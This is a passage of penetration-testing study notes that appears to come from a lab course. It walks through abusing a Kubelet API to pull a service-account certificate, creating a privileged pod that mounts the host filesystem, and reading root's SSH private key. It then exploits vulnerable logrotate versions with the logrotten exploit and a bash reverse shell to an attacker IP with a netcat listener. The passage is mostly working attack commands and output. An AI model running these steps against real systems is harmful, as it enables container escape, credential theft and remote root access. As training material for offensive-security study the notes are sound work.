readme.org
**** Kubelet API - Extracting Certificates
#+BEGIN_SRC bash
  kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

  -----BEGIN CERTIFICATE-----
  MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
  <SNIP>
  MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
  602eXnhZAL3+dA==
#+END_SRC
Now that we have both the ~token~ and ~certificate~, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.
**** List Privilages
#+BEGIN_SRC bash
  export token=`cat k8.token`
  kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
    
  Resources										Non-Resource URLs	Resource Names	Verbs 
  selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
  selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
  pods											[]					[]				[get create list]
  ...SNIP...
#+END_SRC
Here we can see a few very important information. Besides the selfsubject-resources we can ~get~, ~create~, and ~list~ pods which are the resources representing the running container in the cluster. From here on, we can create a ~YAML~ file that we can use to create a new container and mount the entire root filesystem from the host system into this container's ~/root~ directory. From there on, we could access the host systems files and directories. The ~YAML~ file could look like following:
#+BEGIN_SRC yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
#+END_SRC
Once created, we can now create the new pod and check if it is running as expected.
**** Creating a new POD
#+BEGIN_SRC bash
  kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

  pod/privesc created

  kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
#+END_SRC
If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.
**** Extracting Root's SSH Key
#+BEGIN_SRC bash
  kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
#+END_SRC

** Logrotate
Logrotate is a Linux tool that manages log files to prevent disk overflow. It *renames* old log files, can *create* new ones, and *offers options* based on file *size* and *age*. It's controlled through /~etc/logrotate.conf~ and configuration files in /~etc/logrotate.d~/. You can force rotation using -f/--force or manually edit the status file (/var/lib/logrotate.status). Example configuration for dpkg logs is in /etc/logrotate.d/dpkg.
Utility options:
#+BEGIN_SRC bash
  cat /etc/logrotate.conf

  # see "man logrotate" for details

  # global options do not affect preceding include directives

  # rotate log files weekly
  weekly

  # use the adm group by default, since this is the owning group
  # of /var/log/syslog.
  su root adm

  # keep 4 weeks worth of backlogs
  rotate 4

  # create new (empty) log files after rotating old ones
  create

  # use date as a suffix of the rotated file
  #dateext

  # uncomment this if you want your log files compressed
  #compress

  # packages drop log rotation information into this directory
  include /etc/logrotate.d

  # system-specific logs may also be configured here.
#+END_SRC

We can find the corresponding configuration files in ~/etc/logrotate.d/~ directory.
#+BEGIN_SRC bash
    ls /etc/logrotate.d/

    alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp

    cat /etc/logrotate.d/dpkg

  /var/log/dpkg.log {
	  monthly
	  rotate 12
	  compress
	  delaycompress
	  missingok
	  notifempty
	  create 644 root root
  }
#+END_SRC

To exploit ~logrotate~, we need some requirements that we have to fulfill.
    1. we need ~write~ permissions on the log files
    2. logrotate must run as a privileged user or ~root~
    3. vulnerable versions:
        - 3.8.6
        - 3.11.0
        - 3.15.0
        - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [[https://github.com/whotwagner/logrotten][logrotten]]. We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.
#+BEGIN_SRC bash
  git clone https://github.com/whotwagner/logrotten.git
  cd logrotten
  gcc logrotten.c -o logrotten
#+END_SRC

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the IP and port of our VM that we use to attack the target system.
#+BEGIN_SRC bash
  echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
#+END_SRC

However, before running the exploit, we need to determine which option ~logrotate~ uses in ~logrotate.conf~.
#+BEGIN_SRC bash
  grep "create\|compress" /etc/logrotate.conf | grep -v "#"

  create
#+END_SRC

In our case, it is the option: ~create~. Therefore we have to use the exploit adapted to this function.
After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.
#+BEGIN_SRC bash
  nc -nlvp 9001

  Listening on 0.0.0.0 9001
#+END_SRC

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or ~root~.
#+BEGIN_SRC bash
  ./logrotten -p ./payload /tmp/tmp.log
#+END_SRC

~TIPS~
to manually trigger logrotate we can delete the old logs and write on the newer ones. In some cases this can work
** Miscellaneous Techniques
*** Passive Traffic Capture
If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [[https://github.com/DanMcInerney/net-creds][net-creds]] and [[https://github.com/lgandx/PCredz][PCredz]] that can be used to examine data being passed on the wire.
